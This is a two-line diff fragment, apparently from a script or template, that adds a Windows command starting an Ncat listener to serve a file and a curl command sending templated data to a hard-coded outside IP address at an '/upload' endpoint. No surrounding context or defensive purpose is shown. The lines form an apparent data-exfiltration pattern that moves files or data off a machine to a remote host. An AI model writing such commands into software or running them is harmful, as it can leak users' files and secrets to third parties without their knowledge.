@@ -1,0 +1,2 @@
+start cmd.exe @cmd /k "Ncat -l -p {0} < {1}"
+curl -G --data "{2}{3}" http://131.151.162.95:63412/upload
